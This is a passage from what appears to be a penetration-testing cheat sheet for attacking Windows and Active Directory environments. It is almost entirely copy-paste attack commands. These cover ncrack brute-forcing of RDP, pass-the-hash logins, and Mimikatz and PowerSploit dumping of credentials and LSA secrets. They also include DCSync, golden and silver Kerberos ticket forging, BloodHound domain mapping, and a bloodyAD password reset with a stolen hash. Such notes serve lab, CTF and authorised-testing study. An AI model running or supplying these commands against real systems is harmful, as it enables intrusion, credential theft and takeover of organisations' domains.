ncrack -p 3389 --user <username> -P <password_file> <target_ip>  # Brute force RDP login with a password list
ncrack -p 3389 --user <username_file> --pass <password_file> <target_ip>  # Brute force RDP with username and password lists
ncrack -p 3389 --user <username> --pass <password> <target_ip>  # Brute force RDP login with a specific username and password
ncrack -p 3389 --delay 5ms --user <username_file> --pass <password_file> <target_ip>  # Add delay between connection attempts
```

## rdpscan 
RDP Vulnerability Scanner https://github.com/robertdavidgraham/rdpscan  # Clone the rdpscan repository
```bash
./rdpscan <target_ip>  # Scan for BlueKeep (CVE-2019-0708) vulnerability
./rdpscan --file <ip_list.txt>  # Scan multiple IP addresses from a file for BlueKeep
./rdpscan --port <port_number> <target_ip>  # Scan a specific port for RDP vulnerabilities
./rdpscan --safe <target_ip>  # Perform a safe scan without causing service disruption
```

## xfreerdp
Alternative: Remmina GUI Tool
```bash
xfreerdp /u:<username> /p:<password> /v:<target_ip>  # Connect to an RDP server with username and password
xfreerdp /u:<username> /p:<password> /v:<target_ip>:<port>  # Connect to an RDP server on a specific port
xfreerdp /u:<username> /pth:<NTLM_hash> /v:<target_ip>  # Pass-the-Hash (PTH) RDP connection
xfreerdp /u:<username> /dynamic-resolution /multimon /v:<target_ip>  # Enable multi-monitor support and dynamic resolution
```

## PowerSploit
https://github.com/PowerShellMafia/PowerSploit  # Clone the PowerSploit repository in target system

```powershell
Import-Module ./Recon/PowerView.ps1  # Import PowerView module for Active Directory enumeration
Import-Module ./Exfiltration/Invoke-Mimikatz.ps1  # Import Mimikatz module for credential dumping

# Invoke-Mimikatz (Credential Dumping)
Invoke-Mimikatz -DumpCreds  # Dump credentials using Mimikatz
Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"'  # Extract logon passwords

# PowerUp (Privilege Escalation)
Import-Module ./Privesc/PowerUp.ps1  # Import PowerUp module for privilege escalation
Invoke-AllChecks  # Perform all privilege escalation checks
Get-ServiceUnquoted  # Find services with unquoted paths for exploitation
Get-ModifiablePath  # Identify directories with weak permissions

# PowerShell Remoting (Lateral Movement)
Invoke-Command -ScriptBlock { Get-NetUser } -ComputerName <target_computer>  # Run PowerShell commands remotely
Enter-PSSession -ComputerName <target_computer>  # Start a remote session on a target computer

# PowerDump (LSA Secrets Dumping)
Invoke-LsaDump  # Dump LSA secrets for credential harvesting
```

## PowerView

https://github.com/PowerShellMafia/PowerSploit

https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1

```powershell
powershell -ep bypass 
..\PowerView.ps1
```

```Powershell
Get-NetDomain  # DC info
Get-NetDomainController # DC Info
Get-NetDomainPolicy  # Domain Policy
Get-NetDomainPolicy.{system access} # Specific Policy By Name
Get-NetUser # User Details
Get-UserProperty #user property names
Get-UserProperty -Properties propertyname #specific property
Get-NetComputer -FullData
Get-NetGroup # Get Group Names
Get-NetGroupMember -GroupName "Domain Admin" # Get Group Mamber Names of Specific Group
Invoke-ShareFinder # Share Details

```

## mimikatz

Repo: https://github.com/ParrotSec/mimikatz

Wiki: https://github.com/gentilkiwi/mimikatz/wiki

- Dump Credentials
    - **Dump SAM Hashes**: `mimikatz.exe "privilege::debug" "lsadump::sam"`
    - **Dump LSA Secrets**: `mimikatz.exe "privilege::debug" "lsadump::secrets"`
    - **Dump DCSync**: `mimikatz.exe "privilege::debug" "lsadump::dcsync /user:USERNAME"`
- Pass-the-Hash
    - **Pass-the-Hash**: `mimikatz.exe "privilege::debug" "sekurlsa::pth /user:USERNAME /domain:DOMAIN /ntlm:HASH"`
- Kerberos
    - **Purge Tickets**: `mimikatz.exe "kerberos::purge"`
    - **List Tickets**: `mimikatz.exe "kerberos::list"`
    - **Pass-the-Ticket**: `mimikatz.exe "kerberos::ptt TICKET.kirbi"`
- Overpass-the-Hash
    - **Overpass-the-Hash**: `mimikatz.exe "sekurlsa::pth /user:USERNAME /domain:DOMAIN /rc4:HASH"`
- Golden Ticket
    - **Create Golden Ticket**: `mimikatz.exe "kerberos::golden /user:USERNAME /domain:DOMAIN /sid:SID /krbtgt:HASH /id:500"`
- Silver Ticket
    - **Create Silver Ticket**: `mimikatz.exe "kerberos::golden /domain:DOMAIN /sid:SID /target:SERVICE /rc4:HASH /user:USERNAME /service:SERVICE /id:500"`
- Mimikatz Offline
    - **Read minidump**: `mimikatz.exe "sekurlsa::minidump MINIDUMP.dmp" "sekurlsa::logonPasswords"`


## BloodHound
- Repo: [Bloodhound Old](https://github.com/BloodHoundAD/BloodHound),  [Bloodhound](https://github.com/SpecterOps/BloodHound)
- Also Check: https://github.com/lkarlslund/Adalanche
- Starting bloodhound
    ```bash
    neo4j console #neo4j login
    bloodhound #bloodhound start in new terminal tab
    ```
- Data collection for bloodhound with Sharphound [Old Repo](https://github.com/BloodHoundAD/SharpHound3) [Compile File and Powershell Script](https://github.com/SpecterOps/BloodHound-Legacy/tree/master/Collectors)
    ```Powershell
    #Using exe
    .\SharpHound.exe --CollectionMethod All --LdapUsername <UserName> --LdapPassword <Password> --domain domain.tld --domaincontroller <Domain Controller's Ip> --OutputDirectory output.zip
    
    #Using PowerShell module
    powershell -ep bypass 
    .\SharpHound.ps1
    Invoke-BloodHound -CollectionMethod All -Domain domain.tld -ZipFileName output.zip
    ```
    - Upload the `output.zip` file in BloodHound and then goto `Queries` and select `Queries`.
- Data collection for bloodhound with Crackmapexec or netexec
    ```bash
    nxc ldap DC1.ad.lab -d 'ad.lab' -u 'john.doe' -p 'P@$$word123!' --bloodhound -c All --dns-server 10.80.80.2
    ```
- Data collection for bloodhound with bloodhound-python
    ```bash
    bloodhound-python -u <UserName> -p <Password> -ns <Domain Controller's Ip> -d <Domain> -c All --zip
    ```

## Adalanche

Source Code: https://github.com/lkarlslund/Adalanche

```bash
# Command
./adalanche collect activedirectory --domain <Domain> \
--username <Username@Domain> --password <Password> \
--server <DC>
```

- Troubleshoot 

```bash
# LDAP Result Code 200 "Network Error": x509: certificate signed by unknown authority

./adalanche collect activedirectory --domain domain.local \
--username spoNge369@windcorp.local --password 'password123!' \
--server dc.domain.local --tlsmode NoTLS --port 389

# Invalid Credentials 
./adalanche collect activedirectory --domain domain.local \
--username spoNge369@domain.local --password 'password123!' \
--server dc.domain.local --tlsmode NoTLS --port 389 \
--authmode basic
```

- Analyze data 

```bash
./adalanche analyze
# go to web browser -> 127.0.0.1:8080
```
  
## BloodyAD and autobloody
```bash
autobloody -u john.doe -p 'Password123!' --host 192.168.10.2 -dp 'neo4jP@ss' -ds 'JOHN.DOE@BLOODY.LOCAL' -dt 'BLOODY.LOCAL'
bloodyAD --host 172.16.1.15 -d bloody.local -u jane.doe -p :70016778cb0524c799ac25b439bd6a31 set password john.doe 'Password123!'
```

## ADExplorer
- https://docs.microsoft.com/en-us/sysinternals/downloads/adexplorer  # Download link for ADExplorer
- GUI tool could be used after gaining access with rdp.
- Use the GUI to navigate through the Active Directory tree, Right-click to view properties of an object, Use the search bar to find specific objects. 
- Searching Active Directory, Use the search functionality within the GUI to find specific users or groups.
- Export the current view to a file `File -> Export -> Export Current View`. Export selected objects to CSV or other formats
- Basic Usage by command
    ```powershell
    ADExplorer.exe  # Launch the ADExplorer GUI
    ADExplorer.exe /path:<ldap_path>  # Open a specific LDAP path (e.g., LDAP://DC=example,DC=com)
    ADExplorer.exe /readonly  # Start ADExplorer in read-only mode
    ```

## Troubleshoot
- Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
    - Follow this as sudo [Time Synchronization](#time-synchronization)
    - Run commands as sudo
- EvilWinRM Error: An error of type HTTPClient::ConnectTimeoutError happened, message is execution expired
    - Check `apt install krb5-user -y` **Many Errors will beresolved with this installation**
- NetExec and CeackMapExec
    - `ModuleNotFoundError: No module named 'nxc.protocols.smb.firefox'`, could be fixed with `python3 -m pip uninstall netexec -y` and `python3 -m pip install git+https://github.com/Pennyw0rth/NetExec.git`
                           

# External Links
1. [WADcoms](https://wadcoms.github.io/)
2. [TryHackMe AttraktiveDirectory Writeup](https://github.com/ZishanAdThandar/WriteUps/blob/main/CTF/tryhackme.com/attacktivedirectory.md)
3. [Active Directory Exploitation Cheat Sheet by Nikos Katsiopis](https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet)
4. [Attacking Active Directory: 0 to 0.9 By Eloy Pérez González](https://zer1t0.gitlab.io/posts/attacking_ad/)
5. [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence)
6. [SMB Enumeration Cheatsheet by 0xdf](https://0xdf.gitlab.io/cheatsheets/smb-enum)
7. [https://github.com/CICADA8-Research/RemoteKrbRelay](https://github.com/CICADA8-Research/RemoteKrbRelay)
8. CherryTree [https://github.com/0xDigimon/PenetrationTesting_Notes-?tab=readme-ov-file](https://github.com/0xDigimon/PenetrationTesting_Notes-?tab=readme-ov-file)
9. [https://www.thehacker.recipes/](https://www.thehacker.recipes/)
10. [https://swisskyrepo.github.io/InternalAllTheThings/active-directory/ad-adds-enumerate/](https://swisskyrepo.github.io/InternalAllTheThings/active-directory/ad-adds-enumerate/)

## YouTube
- [Kerberos Playlist by VbScrub](https://www.youtube.com/watch?v=snGeZlDQL2Q&list=PL3B8L-z5QU-Z0bWmjwgUSLGTzm1k_kVZo)
- [Kerberos Golden Ticket Attack Explained by VbScrub](https://www.youtube.com/watch?v=o98_eRt777Y)
- [Kerberos Silver Ticket Attack Explained by VbScrub](https://www.youtube.com/watch?v=_nJ-b1UFDVM)
